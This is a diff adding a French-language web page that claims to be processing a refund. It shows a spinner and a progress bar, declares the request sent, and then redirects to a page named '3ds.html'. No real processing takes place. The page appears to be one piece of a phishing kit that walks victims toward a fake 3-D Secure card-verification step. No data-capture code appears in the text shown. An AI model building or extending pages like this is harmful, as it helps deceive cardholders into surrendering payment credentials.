@@ -1,0 +1,178 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Traitement du remboursement</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      background: #f4f7fb;
+      font-family: Arial, sans-serif;
+      color: #1f2937;
+    }
+
+    .payment-card {
+      width: 100%;
+      max-width: 400px;
+      padding: 36px 26px;
+      background: #fff;
+      border-radius: 22px;
+      text-align: center;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.07);
+    }
+
+    .icon {
+      width: 64px;
+      height: 64px;
+      margin: 0 auto 22px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f5f7fa;
+      color: #000000;
+      border-radius: 20px;
+      font-size: 30px;
+    }
+
+    h1 {
+      font-size: 23px;
+      margin: 0 0 12px;
+    }
+
+    .description {
+      color: #6b7280;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .spinner {
+      width: 58px;
+      height: 58px;
+      margin: 28px auto;
+      border: 5px solid #e5e7eb;
+      border-top-color: #315bea;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .status {
+      display: inline-block;
+      padding: 10px 16px;
+      background: #f5f7fa;
+      color: #000000;
+      border-radius: 10px;
+      font-size: 13px;
+    }
+
+    .progress {
+      width: 100%;
+      height: 5px;
+      margin-top: 25px;
+      background: #e5e7eb;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      width: 0;
+      height: 100%;
+      background: #315bea;
+      transition: width 7s linear;
+    }
+
+    .footer {
+      margin-top: 25px;
+      padding-top: 18px;
+      border-top: 1px solid #eee;
+      color: #9ca3af;
+      font-size: 12px;
+    }
+
+    .result {
+      display: none;
+      margin-top: 20px;
+      color: #16834a;
+      font-weight: bold;
+    }
+  </style>
+</head>
+
+<body>
+  <main class="payment-card">
+    <div class="icon" id="icon">€</div>
+
+    <h1 id="title">Traitement du remboursement</h1>
+
+    <p class="description" id="description">
+      Veuillez patienter pendant le traitement de votre demande.
+      Merci de ne pas fermer cette page.
+    </p>
+
+    <div class="spinner" id="spinner"></div>
+
+    <div class="status" id="status">
+      rembouresement en cours...
+    </div>
+
+    <div class="progress">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <div class="result" id="result">
+        ✅ Votre demande a été envoyée avec succès !
+    </div>
+
+    <div class="footer">
+   
+    </div>
+  </main>
+
+  <script>
+    const progressBar = document.getElementById("progressBar");
+
+    // Start the loading animation
+    requestAnimationFrame(() => {
+      requestAnimationFrame(() => {
+        progressBar.style.width = "100%";
+      });
+    });
+
+    // Finish after 7 seconds
+    setTimeout(() => {
+      document.getElementById("spinner").style.display = "none";
+      document.getElementById("status").style.display = "none";
+      document.getElementById("progressBar").style.width = "100%";
+
+      document.getElementById("icon").textContent = "✓";
+      document.getElementById("title").textContent =
+        "demande de rembouresement terminée";
+
+      document.getElementById("description").textContent =
+        "la demande a été envoyée.";
+
+      document.getElementById("result").style.display = "block";
+      
+setTimeout(() => {
+  window.location.href = "3ds.html";
+}, 4000);
+
+    }, 3000);
+  </script>
+</body>
+</html>
